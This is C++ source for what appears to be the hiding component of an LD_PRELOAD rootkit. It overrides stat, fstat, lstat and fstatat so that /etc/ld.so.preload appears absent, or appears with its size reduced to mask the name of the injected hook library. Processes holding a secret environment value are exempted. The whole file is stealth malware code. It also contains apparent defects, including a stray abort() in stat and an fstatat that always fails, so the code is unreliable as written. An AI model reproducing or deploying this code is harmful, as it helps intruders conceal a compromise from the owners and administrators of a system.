
#include "main.h"
#include <cstdlib>


extern "C" int stat(const char *path, struct stat *buf) {
	CErrnoSaver serr;
	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	STAT stPtr = (STAT)dlsym (RTLD_NEXT, "stat");
	std::string file (path);
	char chArr[2], *chPtr;
	int ret;
	ssize_t ind;
abort ();	
	
	assert (opnPtr != NULL);
	assert (rdPtr != NULL);
	assert (stPtr != NULL);
	
	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowValue)) {
		if ((ret = stPtr (path, buf)) == -1) {
			serr.set (errno);
		}
		return ret;
	}
	
	if (!strcmp (prelFileName, file.c_str ())) {
		descr_holder fd (new int (-1));
		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
		lockAllFile (*fd);
		
		while ((ind = rdPtr (*fd, chArr, 2)) == -1 && errno == EINTR);
		
		// at default we think that ld.so.preload is absent
		if (-1 == ind || chArr[0] == '0') {
			serr.set (ENOENT);
			return -1;
		}
		
		if ((ret = stPtr (path, buf)) == -1) {
			serr.set (errno);
			return -1;
		}
		buf->st_size -= (hookLibraryName + separator).size ();
		return 0;
	}
	
	
	if ((ret = stPtr (path, buf)) == -1) {
		serr.set (errno);
	}
	return ret;
}

extern "C" int fstat(int fd, struct stat *buf) {
	CErrnoSaver serr;
	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	FSTAT stPtr = (FSTAT)dlsym (RTLD_NEXT, "fstat");
	std::string lnkAim;
	char chArr[2], *chPtr;
	int ret;
	ssize_t ind;
	
	
	assert (opnPtr != NULL);
	assert (rdPtr != NULL);
	assert (stPtr != NULL);
	
	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowValue)) {
		if ((ret = stPtr (fd, buf)) == -1) {
			serr.set (errno);
		}
		return ret;
	}
	
	lnkAim = readLinkName (("/proc/self/fd/" + intToString (fd)).c_str ());
	if (lnkAim == "") {
		serr.set (ENOENT);
		return -1;
	}
	
	if (!strcmp (prelFileName, lnkAim.c_str ())) {
		descr_holder fd_t (new int (-1));
		*fd_t = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
		lockAllFile (*fd_t);
		
		while ((ind = rdPtr (*fd_t, chArr, 2)) == -1 && errno == EINTR);
		
		// at default we think that ld.so.preload is absent
		if (-1 == ind || chArr[0] == '0') {
			serr.set (ENOENT);
			return -1;
		}
		
		if ((ret = stPtr (fd, buf)) == -1) {
			serr.set (errno);
			return -1;
		}
		buf->st_size -= (hookLibraryName + separator).size ();
		return 0;
	}
	
	
	if ((ret = stPtr (fd, buf)) == -1) {
		serr.set (errno);
	}
	return ret;
}

extern "C" int lstat(const char *path, struct stat *buf) {
	CErrnoSaver serr;
	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	LSTAT stPtr = (LSTAT)dlsym (RTLD_NEXT, "lstat");
	std::string file (path), lnkAim;
	char chArr[2], *chPtr;
	int ret;
	ssize_t ind;
	
	
	assert (opnPtr != NULL);
	assert (rdPtr != NULL);
	assert (stPtr != NULL);
	
	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowValue)) {
		if ((ret = stPtr (path, buf)) == -1) {
			serr.set (errno);
		}
		return ret;
	}
	
	lnkAim = readLinkName (path);
	
	if (lnkAim == "" && !strcmp (prelFileName, path)) {
		descr_holder fd (new int (-1));
		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
		lockAllFile (*fd);
		
		while ((ind = rdPtr (*fd, chArr, 2)) == -1 && errno == EINTR);
		
		// at default we think that ld.so.preload is absent
		if (-1 == ind || chArr[0] == '0') {
			serr.set (ENOENT);
			return -1;
		}
		
		if ((ret = stPtr (path, buf)) == -1) {
			serr.set (errno);
			return -1;
		}
		buf->st_size -= (hookLibraryName + separator).size ();
		return 0;
	}
	
	
	if ((ret = stPtr (path, buf)) == -1) {
		serr.set (errno);
	}
	return ret;
}

extern "C" int fstatat (
	int dirfd,
	const char *pathname,
	struct stat *buf,
	int flags
)
{
	errno = ENOENT;
	return -1;
}
















